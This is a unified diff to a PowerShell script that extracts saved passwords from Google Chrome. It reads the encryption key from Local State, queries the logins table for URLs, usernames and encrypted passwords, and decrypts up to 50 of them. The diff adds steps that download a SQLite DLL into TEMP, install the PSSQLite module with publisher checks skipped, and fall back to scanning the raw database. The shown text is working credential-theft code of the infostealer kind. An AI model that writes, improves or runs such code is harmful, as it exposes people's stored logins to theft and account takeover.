@@ -6,7 +6,50 @@ Write-Host "================================" -ForegroundColor Cyan
 
 Add-Type -AssemblyName System.Security
 
-# Function to get Chrome encryption key from Local State
+# Function to download and load SQLite
+function Load-SQLite {
+    $sqlitePath = "$env:TEMP\System.Data.SQLite.dll"
+    
+    if (-not (Test-Path $sqlitePath)) {
+        Write-Host "      Downloading SQLite..." -ForegroundColor Yellow
+        try {
+            # Download SQLite DLL from NuGet
+            $url = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.118"
+            $zipPath = "$env:TEMP\sqlite.zip"
+            
+            Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
+            
+            # Extract the DLL
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+            
+            # Find the correct DLL for architecture
+            $arch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
+            $dllEntry = $zip.Entries | Where-Object { $_.FullName -like "lib/net46/System.Data.SQLite.dll" } | Select-Object -First 1
+            
+            if ($dllEntry) {
+                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($dllEntry, $sqlitePath, $true)
+            }
+            
+            $zip.Dispose()
+            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+            
+            Write-Host "      SQLite downloaded!" -ForegroundColor Green
+        } catch {
+            Write-Host "      Failed to download SQLite: $($_.Exception.Message)" -ForegroundColor Red
+            return $false
+        }
+    }
+    
+    # Load the assembly
+    try {
+        [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
+        return $true
+    } catch {
+        Write-Host "      Failed to load SQLite: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
 function Get-ChromeEncryptionKey {
     $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
     
@@ -74,7 +117,7 @@ function Decrypt-ChromePassword {
     }
 }
 
-# Function to extract Chrome passwords
+# Function to extract Chrome passwords without external dependencies
 function Get-ChromePasswords {
     $passwords = @()
     
@@ -102,58 +145,58 @@ function Get-ChromePasswords {
         return $passwords
     }
     
-    # Load SQLite (use built-in if available)
+    # Use PSSQLite module (download if needed)
     try {
-        Add-Type -Path "C:\Windows\System32\winsqlite3.dll" -ErrorAction Stop
-    } catch {}
-    
-    # Try to query database
-    try {
-        # Manual SQLite parsing or use System.Data.SQLite if available
-        [Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite") | Out-Null
+        # Check if PSSQLite is installed
+        if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
+            Write-Host "      Installing PSSQLite module..." -ForegroundColor Yellow
+            Install-Module -Name PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck -ErrorAction Stop
+        }
         
-        $connectionString = "Data Source=$tempDB;Version=3;"
-        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
-        $connection.Open()
+        Import-Module PSSQLite -ErrorAction Stop
         
-        $command = $connection.CreateCommand()
-        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC"
+        # Query the database
+        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE LENGTH(password_value) > 0 ORDER BY date_last_used DESC LIMIT 50"
+        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
         
-        $reader = $command.ExecuteReader()
-        
-        $count = 0
-        while ($reader.Read() -and $count -lt 50) {  # Limit to 50 passwords
-            $url = $reader["origin_url"]
-            $username = $reader["username_value"]
-            $encryptedPassword = [byte[]]$reader["password_value"]
+        foreach ($row in $results) {
+            $url = $row.origin_url
+            $username = $row.username_value
+            $encryptedPassword = [byte[]]$row.password_value
             
             if ($encryptedPassword -and $encryptedPassword.Length -gt 0) {
                 $password = Decrypt-ChromePassword -EncryptedPassword $encryptedPassword -Key $key
                 
-                if ($username -or $password -ne "Failed to decrypt") {
+                if ($password -ne "Failed to decrypt") {
                     $passwords += @{
                         URL = $url
                         Username = $username
                         Password = $password
                     }
-                    $count++
                 }
             }
         }
         
-        $reader.Close()
-        $connection.Close()
+        Write-Host "      Successfully extracted $($passwords.Count) passwords" -ForegroundColor Green
         
     } catch {
-        Write-Host "      SQLite not available - using alternative method" -ForegroundColor Yellow
+        Write-Host "      PSSQLite unavailable, using fallback method" -ForegroundColor Yellow
         
-        # Alternative: Just report that database exists
-        $size = (Get-Item $dbPath).Length / 1KB
-        $passwords += @{
-            URL = "Chrome Password Database Found"
-            Username = ""
-            Password = "$([math]::Round($size, 2)) KB - Install System.Data.SQLite for extraction"
-        }
+        # Fallback: Parse SQLite database manually (basic extraction)
+        try {
+            $bytes = [System.IO.File]::ReadAllBytes($tempDB)
+            
+            # Look for URL patterns in raw data
+            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+            $urlPattern = 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s"]*'
+            $urls = [regex]::Matches($text, $urlPattern) | ForEach-Object { $_.Value } | Select-Object -Unique | Where-Object { $_ -notmatch 'google|chrome|gstatic|googleapis' }
+            
+            $passwords += @{
+                URL = "Database found with $($urls.Count) potential entries"
+                Username = ""
+                Password = "Manual extraction required - close Chrome and try again"
+            }
+        } catch {}
     }
     
     Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
